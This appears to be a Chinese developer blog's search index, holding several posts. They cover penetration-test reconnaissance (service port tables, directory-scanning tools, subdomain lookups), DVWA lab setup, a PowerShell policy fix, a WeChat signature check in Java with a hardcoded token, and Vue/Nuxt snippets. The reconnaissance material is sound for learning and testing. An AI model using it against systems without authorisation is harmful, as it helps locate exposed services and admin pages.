<td style="text-align:center">5432</td>
<td style="text-align:center">postgreSQL</td>
</tr>
<tr>
<td style="text-align:center">2100</td>
<td style="text-align:center">Oracle XDB FTP 服务</td>
</tr>
<tr>
<td style="text-align:center">1433</td>
<td style="text-align:center">MSSQL SERVER 数据库 server</td>
</tr>
<tr>
<td style="text-align:center">1434</td>
<td style="text-align:center">MSSQL SERVER 数据库 monitor</td>
</tr>
<tr>
<td style="text-align:center">5000</td>
<td style="text-align:center">Sysbase DB2</td>
</tr>
<tr>
<td style="text-align:center">6379</td>
<td style="text-align:center">redis</td>
</tr>
<tr>
<td style="text-align:center">11211</td>
<td style="text-align:center">memcache</td>
</tr>
<tr>
<td style="text-align:center">27017</td>
<td style="text-align:center">mongod 和 mongos 实例的默认端口。你可以通过 port 或 —port 改变该端口。</td>
</tr>
<tr>
<td style="text-align:center">27018</td>
<td style="text-align:center">mongodb 设置 —shardsvr 运行变量或在配置文件里设置 clusterRole 为 shardsvr 时的默认端口。</td>
</tr>
<tr>
<td style="text-align:center">27019</td>
<td style="text-align:center">mongodb 设置 —configsvr 运行变量或在配置文件中将 clusterRole 设置为 configsvr 时的默认端口。</td>
</tr>
<tr>
<td style="text-align:center">28017</td>
<td style="text-align:center">mongodb 系统状态网页的默认端口。系统状态网络页面永远可以在比 port 大 1000 的端口反问。</td>
</tr>
</tbody>
</table>
</div>
<h2 id="其他服务"><a href="#其他服务" class="headerlink" title="其他服务"></a>其他服务</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">端口</th>
<th style="text-align:center">服务类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">2181</td>
<td style="text-align:center">zookeeper</td>
</tr>
<tr>
<td style="text-align:center">5671</td>
<td style="text-align:center">rabbitMQ</td>
</tr>
<tr>
<td style="text-align:center">3128</td>
<td style="text-align:center">squid 代理服务器</td>
</tr>
<tr>
<td style="text-align:center">8069</td>
<td style="text-align:center">zabbix</td>
</tr>
<tr>
<td style="text-align:center">7077</td>
<td style="text-align:center">spark</td>
</tr>
<tr>
<td style="text-align:center">9200/9300</td>
<td style="text-align:center">Elasticearch</td>
</tr>
<tr>
<td style="text-align:center">3690</td>
<td style="text-align:center">SVN</td>
</tr>
<tr>
<td style="text-align:center">512/513/514</td>
<td style="text-align:center">Linux Rexec 服务</td>
</tr>
<tr>
<td style="text-align:center">873</td>
<td style="text-align:center">Rsync 服务</td>
</tr>
<tr>
<td style="text-align:center">50000</td>
<td style="text-align:center">SAP management console</td>
</tr>
</tbody>
</table>
</div>
<h1 id="检测服务目录"><a href="#检测服务目录" class="headerlink" title="检测服务目录"></a>检测服务目录</h1><p>渗透测试中，扫描服务器的敏感目录或文件是主要的环节,从中可以获取文件的后台控制页面、敏感秘钥文件目录、甚至获取到网站的源代码.比较常用的工</p>
<p>具有御剑后台扫描,DirBuster,wwwscan 等工具来扫描服务器的目录信息。</p>
<p>wwwscan 扫描的结果,发现的目录会直接显示出来.</p>
<p><img src="/2019/07/16/security/渗透测试之信息收集/2019-07-17_142004.png" alt></p>
<h1 id="子域名检测"><a href="#子域名检测" class="headerlink" title="子域名检测"></a>子域名检测</h1><p>到这几个网站上即可在线检测域名对应的子域名信息</p>
<p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a><br><a href="http://tool.chinaz.com/subdomain" target="_blank" rel="noopener">站长工具 &gt; 子域名查询</a></p>
<p><img src="/2019/07/16/security/渗透测试之信息收集/sub_20190717110811.png" alt></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="http://cert.sjtu.edu.cn/doc/linux/ch-ports.html" target="_blank" rel="noopener">红帽企业 Linux 中的服务、守护进程、和程序所使用的最常见的通信端口</a></p>
</li>
<li><p><a href="http://cert.sjtu.edu.cn/" target="_blank" rel="noopener">上海交通大学网络信息中心网络紧急响应组</a></p>
</li>
<li><p><a href="https://zhuanlan.zhihu.com/p/23208883" target="_blank" rel="noopener">渗透测试研究中心 google hacker 语法手册</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试环境DVWA环境搭建</title>
    <url>/2019/07/13/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83DVWA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>DVWA主要是用于学习Web的常见攻击，比如SQL注入、XSS等的一个渗透测试系统.<br><a id="more"></a></p>
<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>由于DVWA是用php语言写的安全测试平台，所以我们先要创建一个php开发集成环境。</p>
<blockquote>
<ul>
<li>XAMPP安装</li>
</ul>
</blockquote>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>到 <a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">DVWA</a>下载应用包,是一个zip。解压到xampp的htdocs目录并重命名为dvwa。</p>
<h1 id="启动xampp"><a href="#启动xampp" class="headerlink" title="启动xampp"></a>启动xampp</h1><p><img src="/2019/07/13/security/渗透测试环境DVWA环境搭建/20190713184244.png" alt></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>浏览器输入localhost://82/dvma即可进入dvwa配置界面</p>
<p><img src="/2019/07/13/security/渗透测试环境DVWA环境搭建/20190713182441.png" alt></p>
<h2 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h2><p>点击创建即可,下面会提示错误信息.数据库未连接等.修改配置</p>
<p>成功后进入登录页面<br><img src="/2019/07/13/security/渗透测试环境DVWA环境搭建/20190713183444.png" alt><br>输入密码 admin/password进入主界面.<br><img src="/2019/07/13/security/渗透测试环境DVWA环境搭建/index_20190713_1837.png" alt></p>
<p>至此DVWA的环境已经搭建ok.</p>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><h2 id="DVWA-System-error-config-file-not-found-Copy-config-config-inc-php-dist-to-config-config-inc-php-and-configure-to-your-environment"><a href="#DVWA-System-error-config-file-not-found-Copy-config-config-inc-php-dist-to-config-config-inc-php-and-configure-to-your-environment" class="headerlink" title="DVWA System error - config file not found. Copy config/config.inc.php.dist to config/config.inc.php and configure to your environment."></a>DVWA System error - config file not found. Copy config/config.inc.php.dist to config/config.inc.php and configure to your environment.</h2><p>将config.inc.php.dist 重命名为config.inc.php即可.</p>
<h2 id="Could-not-connect-to-the-MySQL-service-Please-check-the-config-file"><a href="#Could-not-connect-to-the-MySQL-service-Please-check-the-config-file" class="headerlink" title="Could not connect to the MySQL service.Please check the config file."></a>Could not connect to the MySQL service.Please check the config file.</h2><p>修改config.inc.php中对应的数据库用户名、密码等信息。</p>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>g2.ps1，因为在此系统上禁止运行脚本</title>
    <url>/2020/08/05/%E5%89%8D%E7%AB%AF/g2.ps1%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%9C%A8%E6%AD%A4%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%A6%81%E6%AD%A2%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>在进行安装配置nutui开发环境的时候各种出错。用的官方推荐的工具gaea CLI,刚开始执行命令便出错了。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g2 : 无法加载文件 C:\Users\Administrator\AppData\Roaming\npm\g2.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 h</span><br><span class="line">ttps:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。</span><br><span class="line">所在位置 行:1 字符: 1</span><br><span class="line">+ g2 init driver-nut</span><br><span class="line">+ ~~</span><br><span class="line">    + CategoryInfo          : SecurityError: (:) []，PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : UnauthorizedAccess</span><br></pre></td></tr></table></figure></p>
<p>解决方法也较简单，重新设置一下权限，再次安装即可。<br><img src="/2020/08/05/前端/g2.ps1，因为在此系统上禁止运行脚本/2020-08-05_223118.jpg" alt><br>项目可以正常初始化了，在nodejs安装依赖的过程中又出现了各种错误。</p>
<blockquote>
<ol>
<li>python版本必须是2.x,不支持python3 .</li>
</ol>
</blockquote>
<p>这就是在编译nutui的过程中遇到的问题。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>app</tag>
        <tag>nutui</tag>
      </tags>
  </entry>
  <entry>
    <title>Token校验失败,请检查确认</title>
    <url>/2019/07/25/%E5%89%8D%E7%AB%AF/Token%E6%A0%A1%E9%AA%8C%E5%A4%B1%E8%B4%A5%E8%AF%B7%E6%A3%80%E6%9F%A5%E7%A1%AE%E8%AE%A4/</url>
    <content><![CDATA[<p>小程序开启消息推送的时候需要做签名验证,但是总是提示失败。<br><img src="/2019/07/25/前端/Token校验失败请检查确认/54256-c0422bdf632f7453.webp" alt></p>
<a id="more"></a>
<h1 id="确认签名规则"><a href="#确认签名规则" class="headerlink" title="确认签名规则"></a>确认签名规则</h1><p>检查签名字符串的拼接规则,<br>开发者通过检验 signature 对请求进行校验（下面有校验方式）。若确认此次 GET 请求来自微信服务器，请原样返回 echostr 参数内容，则接入生效，成为开发者成功，否则接入失败。加密/校验流程如下：</p>
<ol>
<li>将 token、timestamp、nonce 三个参数进行字典序排序</li>
<li>将三个参数字符串拼接成一个字符串进行 sha1 加密</li>
<li>开发者获得加密后的字符串可与 signature 对比，标识该请求来源于微信</li>
</ol>
<p>先将值放入数组中,再字典排序后拼接为一个字符串最后 SHA-1 加密得到签名。</p>
<h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"sign"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sign</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      @RequestParam(<span class="string">"signature"</span>)</span> String signature,</span></span><br><span class="line"><span class="function">      @<span class="title">RequestParam</span><span class="params">(<span class="string">"timestamp"</span>)</span> String timestamp,</span></span><br><span class="line"><span class="function">      @<span class="title">RequestParam</span><span class="params">(<span class="string">"nonce"</span>)</span> String nonce,</span></span><br><span class="line"><span class="function">      @<span class="title">RequestParam</span><span class="params">(<span class="string">"echostr"</span>)</span> String echostr, HttpServletResponse response) </span>&#123;</span><br><span class="line">    log.info(<span class="string">"timestamp=&#123;&#125;,nonce=&#123;&#125;,echostr=&#123;&#125;,signature=&#123;&#125;"</span>, timestamp, nonce, echostr, signature);</span><br><span class="line">    String token = <span class="string">"U2FsdGVkX1CuUzHYj7SALkzMSP1Kj913"</span>;</span><br><span class="line">    String[] signAry = &#123;timestamp, nonce, token&#125;;</span><br><span class="line">    String sign = SignUtil.sign(signAry);</span><br><span class="line">    log.info(<span class="string">"sign=&#123;&#125;"</span>, sign);</span><br><span class="line">    <span class="keyword">if</span>(Objects.equals(sign, signature)) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        response.getWriter().write(echostr);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="签名方法"><a href="#签名方法" class="headerlink" title="签名方法"></a>签名方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SignUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 将数组排序后SHA1签名.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> strAry 待签名数组</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">sign</span><span class="params">(String[] strAry)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strAry == <span class="keyword">null</span> || strAry.length == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(strAry);</span><br><span class="line">    String signStr = String.join(<span class="string">""</span>, strAry);</span><br><span class="line">    <span class="keyword">return</span> SHA1Util.encrypt(signStr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SHA-1-加密"><a href="#SHA-1-加密" class="headerlink" title="SHA-1 加密"></a>SHA-1 加密</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SHA1Util</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span>[] HEX_DIGITS = &#123;<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>,</span><br><span class="line">      <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Takes the raw bytes from the digest and formats them correct.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> bytes the raw bytes from the digest.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the formatted bytes.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getFormattedText</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = bytes.length;</span><br><span class="line">    StringBuilder buf = <span class="keyword">new</span> StringBuilder(len * <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 把密文转换成十六进制的字符串形式</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">      buf.append(HEX_DIGITS[( bytes[j] &gt;&gt; <span class="number">4</span> ) &amp; <span class="number">0x0f</span>]);</span><br><span class="line">      buf.append(HEX_DIGITS[bytes[j] &amp; <span class="number">0x0f</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf.toString();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 加密.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> str 待加密字符串</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(str == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      MessageDigest messageDigest = MessageDigest.getInstance(<span class="string">"SHA1"</span>);</span><br><span class="line">      messageDigest.update(str.getBytes());</span><br><span class="line">      <span class="keyword">return</span> getFormattedText(messageDigest.digest());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="返回值类型"><a href="#返回值类型" class="headerlink" title="返回值类型"></a>返回值类型</h1><p>最后如果验签通过,返回 echostr.一定返回地是普通的文本内容,非字符串。否则也会配置失败。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/server-ability/message-push.html#option-url" target="_blank" rel="noopener">微信消息推送文档</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>vue.js中axios发送get、post请求</title>
    <url>/2018/12/18/%E5%89%8D%E7%AB%AF/vue.js%E4%B8%ADaxios%E5%8F%91%E9%80%81get%E3%80%81post%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<p>vue.js中axios发送get、post请求踩得几个坑,顺手写下。以防再犯。</p>
<a id="more"></a>
<p>get比较简单，主要是post。post一种是以字符串方式拼接提交,一种以表单对象提交。本质上都是一样的，都是转化为普通的字符串拼接后以对应的请求头Content-Type指定的类型来提交数据。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form</span> <span class="attr">ref</span>=<span class="string">"form"</span> <span class="attr">:model</span>=<span class="string">"user"</span> <span class="attr">label-width</span>=<span class="string">"100px"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"用户名"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-input</span>  <span class="attr">v-model</span>=<span class="string">"user.name"</span> <span class="attr">clearable</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"密码"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">v-model</span>=<span class="string">"user.password"</span> <span class="attr">clearable</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"登录角色"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-select</span> <span class="attr">v-model</span>=<span class="string">"user.role"</span> <span class="attr">placeholder</span>=<span class="string">"请选择登录角色"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"学生"</span> <span class="attr">value</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"教师"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span> @<span class="attr">click</span>=<span class="string">"onSubmit"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">import API from '../../util/api'</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">export default &#123;</span></span><br><span class="line"><span class="undefined">  data: function () &#123;</span></span><br><span class="line"><span class="undefined">    return &#123;</span></span><br><span class="line"><span class="undefined">      user: &#123;</span></span><br><span class="line"><span class="undefined">        name: '',</span></span><br><span class="line"><span class="undefined">        password: '',</span></span><br><span class="line"><span class="undefined">        role: ''</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  methods: &#123;</span></span><br><span class="line"><span class="undefined">    onSubmit: function () &#123;</span></span><br><span class="line"><span class="undefined">       /* get 方式 */ </span></span><br><span class="line"><span class="undefined">      API.get('/login', &#123; params: this.user &#125;).then(response =&gt; &#123;</span></span><br><span class="line"><span class="undefined">        console.info(response)</span></span><br><span class="line"><span class="undefined">      &#125;).catch(error =&gt; &#123;</span></span><br><span class="line"><span class="undefined">        console.error(error)</span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">       </span></span><br><span class="line"><span class="undefined">       /* post 参数拼接提交 */</span></span><br><span class="line"><span class="undefined">      let params = new URLSearchParams()</span></span><br><span class="line"><span class="undefined">      let obj = this.user</span></span><br><span class="line"><span class="undefined">      Object.keys(obj).forEach(function (key) &#123;</span></span><br><span class="line"><span class="undefined">        params.append(key, obj[key])</span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">      console.info('params= ' + params + ',userObject= ' + this.user)</span></span><br><span class="line"><span class="undefined">      API.post('/login', params, &#123;</span></span><br><span class="line"><span class="undefined">        headers: &#123;</span></span><br><span class="line"><span class="undefined">          'Content-Type': 'application/x-www-form-urlencoded'</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;).then(response =&gt; &#123;</span></span><br><span class="line"><span class="undefined">        console.info(response)</span></span><br><span class="line"><span class="undefined">      &#125;).catch(error =&gt; &#123;</span></span><br><span class="line"><span class="undefined">        console.error(error)</span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      /* form object 提交 */</span></span><br><span class="line"><span class="undefined">      API.post('/login', this.user, &#123;</span></span><br><span class="line"><span class="undefined">        headers: &#123;</span></span><br><span class="line"><span class="undefined">          'Content-Type': 'application/x-www-form-urlencoded'</span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        transformRequest: [function (data) &#123;</span></span><br><span class="line"><span class="undefined">          let ret = ''</span></span><br><span class="line"><span class="undefined">          for (let it in data) &#123;</span></span><br><span class="line"><span class="undefined">            ret += encodeURIComponent(it) + '=' + encodeURIComponent(data[it]) + '&amp;'</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">          return ret</span></span><br><span class="line"><span class="undefined">        &#125;]</span></span><br><span class="line"><span class="undefined">      &#125;).then(response =&gt; &#123;</span></span><br><span class="line"><span class="undefined">        console.info(response)</span></span><br><span class="line"><span class="undefined">      &#125;).catch(error =&gt; &#123;</span></span><br><span class="line"><span class="undefined">        console.error(error)</span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="https://www.npmjs.com/package/axios" target="_blank" rel="noopener">axios Examples</a></p>
</li>
<li><p><a href="https://github.com/axios/axios" target="_blank" rel="noopener">axios github</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>nuxt.js使用vue-awesome-swiper实现轮播图的问题</title>
    <url>/2021/05/30/%E5%89%8D%E7%AB%AF/vue%E5%AE%9E%E7%8E%B0%E8%BD%AE%E6%92%AD%E5%9B%BE%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>最近在实现一个轮播图的功能，因为用的nuxt.js，轮播图控件选择的vue-awesome-swiper。在集成轮播图的过程中也遇到了很多问题，特此记录。</p>
<h1 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h1><p>注意版本的问题，npm安装默认的版本是swiper6，会出现各种问题，要指定版本安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;vue-awesome-swiper&quot;: &quot;^3.1.3&quot;,</span><br><span class="line">&quot;swiper&quot;: &quot;^3.4.2&quot;</span><br></pre></td></tr></table></figure>
<h1 id="配置及使用"><a href="#配置及使用" class="headerlink" title="配置及使用"></a>配置及使用</h1><ol>
<li>在nuxt的plugins文件夹下新建一个swiper的插件，vue-swiper.js</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="comment">// 这样使用是为了避免Nuxt在服务端渲染时找不到window而出现window未定义错误</span></span><br><span class="line"><span class="keyword">if</span> (process.browser) &#123;</span><br><span class="line">  <span class="keyword">const</span> VueAwesomeSwiper = <span class="built_in">require</span>(<span class="string">"vue-awesome-swiper/dist/ssr"</span>);</span><br><span class="line">  Vue.use(VueAwesomeSwiper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>nuxt.config.js中引入插件</li>
</ol>
<p>引入插件和样式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    &#123; <span class="attr">src</span>: <span class="string">'~/plugins/vue-swiper'</span>, <span class="attr">ssr</span>: <span class="literal">false</span> &#125;</span><br><span class="line">  ],</span><br><span class="line">css: [</span><br><span class="line">    <span class="string">"swiper/dist/css/swiper.css"</span></span><br><span class="line">  ],</span><br></pre></td></tr></table></figure>
<ol>
<li>使用</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;div v-swiper:swiperTop=&quot;swiperOptionTop&quot; class=&quot;swiper-imgs swiper-container&quot;&gt;</span><br><span class="line">              &lt;div class=&quot;swiper-wrapper&quot;&gt;</span><br><span class="line">                </span><br><span class="line">                &lt;div class=&quot;swiper-slide&quot;&gt;</span><br><span class="line">                  &lt;img src=&quot;1.png&quot;/&gt;</span><br><span class="line">                  &lt;img src=&quot;2.png&quot;/&gt;</span><br><span class="line">                  &lt;img src=&quot;3.png&quot;/&gt;</span><br><span class="line">                  &lt;img src=&quot;4.png&quot;/&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">              &lt;/div&gt;  </span><br><span class="line">    &lt;div class=&quot;swiper-pagination swiper-pagination-bullets&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      swiperOptionTopMsg: &#123;</span><br><span class="line">        direction: &apos;vertical&apos;,</span><br><span class="line">        autoplay: &#123;</span><br><span class="line">          delay: 1500,</span><br><span class="line">          stopOnLastSlide: false,</span><br><span class="line">          disableOnInteraction: true</span><br><span class="line">        &#125;// 可选选项，自动滑动</span><br><span class="line">      &#125;,</span><br><span class="line">      swiperOptionTop: &#123;</span><br><span class="line">        pagination: &#123;</span><br><span class="line">          el: &apos;.swiper-pagination&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        autoplay: &#123;</span><br><span class="line">          delay: 3000,</span><br><span class="line">          stopOnLastSlide: false,</span><br><span class="line">          disableOnInteraction: true</span><br><span class="line">        &#125;// 可选选项，自动滑动</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><h4 id="一、没有效果"><a href="#一、没有效果" class="headerlink" title="一、没有效果"></a>一、没有效果</h4><p>我这里是报错v-swiper指定未定义,如果以上配置都OK,那么最大的可能就是swiper版本问题。</p>
<h4 id="二、window未定义"><a href="#二、window未定义" class="headerlink" title="二、window未定义"></a>二、window未定义</h4><p><img src="/2021/05/30/前端/vue实现轮播图的问题/wind.png" alt></p>
<p>Nuxt在服务端渲染时找不到window,最开始的引入方法是这样的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> VueAwesomeSwiper <span class="keyword">from</span> <span class="string">"vue-awesome-swiper"</span>;</span><br><span class="line">Vue.use(VueAwesomeSwiper);</span><br></pre></td></tr></table></figure>
